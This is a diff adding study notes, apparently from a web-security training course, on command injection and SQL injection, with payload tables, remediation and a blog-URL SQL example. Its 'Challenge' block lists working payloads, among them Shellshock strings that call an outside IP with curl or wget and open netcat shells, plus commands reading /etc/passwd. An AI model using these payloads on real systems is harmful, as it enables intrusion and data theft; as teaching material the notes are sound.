@@ -698,6 +698,201 @@ This will send the cookies (with high privilege) to our server
 
 ![xss](./media/5-xss.png)
 
+## COMMAND INJECTION 
+
+A command injection vulnerability is also known as a "Remote Code Execution" (RCE) because an attacker can trick the application into executing a series of payloads that they provide, without direct access to the machine itself (i.e. an interactive shell). The webserver will process this code and execute it under the privileges and access controls of the user who is running that application.
+Command injection is also often known as “Remote Code Execution” (RCE) because of the ability to remotely execute code within an application. These vulnerabilities are often the most lucrative to an attacker because it means that the attacker can directly interact with the vulnerable system. For example, an attacker may read system or user files, data, and things of that nature.
+For example, being able to abuse an application to perform the command whoami to list what user account the application is running will be an example of command injection.
+Command injection was one of the top ten vulnerabilities reported by Contrast Security’s AppSec intelligence report in 2019. (Contrast Security AppSec., 2019). Moreover, the OWASP framework constantly proposes vulnerabilities of this nature as one of the top ten vulnerabilities of a web application (OWASP framework).
+
+### Exploiting Command Injection
+ 
+Command Injection can be detected in mostly one of two ways:
+
+Blind command injection
+Verbose command injection
+
+|  Method |                                                                                                                                 Description                                                                                                                                 |
+|:-------:|:---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------:|
+|  Blind  |                        This type of injection is where there is no direct output from the application when testing payloads. You will have to investigate the behaviours of the application to determine whether or not your payload was successful.                        |
+| Verbose | This type of injection is where there is direct feedback from the application once you have tested a payload. For example, running the `whoami` command to see what user the application is running under. The web application will output the username on the page directly. | 
+
+
+**Detecting Blind Command Injection**
+
+Blind command injection is when command injection occurs; however, there is no output visible, so it is not immediately noticeable. For example, a command is executed, but the web application outputs no message 
+
+**USEFUL PAYLOADS**
+
+LINUX 
+| Payload |                                                                                                      Description                                                                                                     |
+|:-------:|:--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------:|
+|  whoami |                                                                                    See what user the application is running under.                                                                                   |
+|    ls   |                List the contents of the current directory. You may be able to find files such as configuration files, environment files (tokens and application keys), and many more valuable things.                |
+|   ping  |                                             This command will invoke the application to hang. This will be useful in testing an application for blind command injection.                                             |
+|  sleep  |                                         This is another useful payload in testing an application for blind command injection, where the machine does not have ping installed.                                        |
+|    nc   | Netcat can be used to spawn a reverse shell onto the vulnerable application. You can use this foothold to navigate around the target machine for other services, files, or potential means of escalating privileges. | 
+
+WINDOWS
+
+| Payload |                                                                                       Description                                                                                      |
+|:-------:|:--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------:|
+|  whoami |                                                                     See what user the application is running under.                                                                    |
+|   dir   | List the contents of the current directory. You may be able to find files such as configuration files, environment files (tokens and application keys), and many more valuable things. |
+|   ping  |                              This command will invoke the application to hang. This will be useful in testing an application for blind command injection.                              |
+| timeout |          This command will also invoke the application to hang. It is also useful for testing an application for blind command injection if the ping command is not installed.         |
+
+
+### REMEDIATING COMMAND INJECTION 
+
+**Input sanitisation**
+
+Sanitising any input from a user that an application uses is a great way to prevent command injection. This is a process of specifying the formats or types of data that a user can submit. For example, an input field that only accepts numerical data or removes any special characters such as `>` ,  `&` and `/`. 
+
+**Bypassing Filters**
+
+Applications will employ numerous techniques in filtering and sanitising data that is taken from a  user's input. These filters will restrict you to specific payloads; however, we can abuse the logic behind an application to bypass these filters. For example, an application may strip out quotation marks; we can instead use the hexadecimal value of this to achieve the same result.
+
+When executed, although the data given will be in a different format than what is expected, it can still be interpreted and will have the same result.
+
+![cc](./media/5-command-payload.png)
+
+
+### Challenge
+
+payload cheetsheet
+
+https://github.com/payloadbox/command-injection-payload-list
+
+
+Linux  Here are some of the payloads 
+```bash
+&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;
+&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
+/index.html|id|
+;id;
+;id
+;netstat -a;
+;system('cat%20/etc/passwd')
+;id;
+|id
+|/usr/bin/id
+|id|
+;id|
+\n/bin/ls -al\n
+\n/usr/bin/id\n
+\nid\n
+\n/usr/bin/id;
+\nid;
+id`
+$;/usr/bin/id
+() { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=16?user=\`whoami\`"
+() { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=24?shell=\`nc -lvvp 1234 -e /bin/bash\`"
+() { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=26?shell=\`nc -lvvp 1236 -e /bin/bash &\`"
+() { :;}; /bin/bash -c "sleep 1 && echo vulnerable 1"
+() { :;}; /bin/bash -c "sleep 6 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=9&?vuln=9"
+() { :;}; /bin/bash -c "wget http://135.23.158.130/.testing/shellshock.txt?vuln=27?shell=\`nc -lvvp 1237 -e /bin/bash &\`"
+$(`cat /etc/passwd`)
+cat /etc/passwd
+%0Acat%20/etc/passwd
+{{ get_user_file("/etc/passwd") }}
+<!--#exec cmd="/usr/bin/id;-->
+system('cat /etc/passwd');
+<?php system("cat /etc/passwd");?>
+
+```
+### Conclusion 
+
+Well done for making it to the end of this room. To recap, we’ve learned about the following elements of command injection:
+
+How to discover the command injection vulnerability
+How to test and exploit this vulnerability using payloads designed for different operating systems
+How to prevent this vulnerability in an application
+Applying your learning by performing command injection in a practical application
+ 
+
+## SQL INJECTION 
+
+SELECT 
+> retrieve data
+
+```
+select * from users;
+select username,password from users;
+select * from users LIMIT 1;
+select * from users where username != 'admin';
+select * from users where username='admin' and password='p4ssword'; 
+
+```
+
+
+UNION
+> Combines multiple tables 
+```mysql
+SELECT name,address,city,postcode from customers UNION SELECT company,address,city,postcode from suppliers;
+
+```
+
+INSERT 
+> adds data 
+```mysql
+insert into users (username,password) values ('bob','password123');
+```
+
+### WHAT IS SQL INJECTION 
+
+What is SQL Injection?
+The point wherein a web application using SQL can turn into SQL Injection is when user-provided data gets included in the SQL query.
+
+What does it look like?
+
+Take the following scenario where you've come across an online blog, and each blog entry has a unique id number. The blog entries may be either set to public or private depending on whether they're ready for public release. The URL for each blog entry may look something like this:
+
+```
+https://website.thm/blog?id=1 
+```
+translate into this SQL STATEMENT
+
+```
+SELECT * from blog where id=1 and private=0 LIMIT 1;
+```
+
+
+Let's pretend article id 2 is still locked as private, so it cannot be viewed on the website. We could now instead call the URL:
+```
+https://website.thm/blog?id=2;--
+```
+
+Which would then, in turn, produce the SQL statement:
+```
+SELECT * from blog where id=2;-- and private=0 LIMIT 1;
+
+```
+The semicolon in the URL signifies the end of the SQL statement, and the two dashes cause everything afterwards to be treated as a comment. By doing this, you're just, in fact, running the query:
+
+```
+SELECT * from blog where id=2;--
+
+```
+
+Which will return the article with an id of 2 whether it is set to public or not.
+
+This was just one example of an SQL Injection vulnerability of a type called In-Band SQL Injection;
+there are 3 types in total 
+- In-Band, 
+- Blind 
+- Out Of Band 
+
+
+
+
+
+
+
+
+
+
+
 
 ---
 
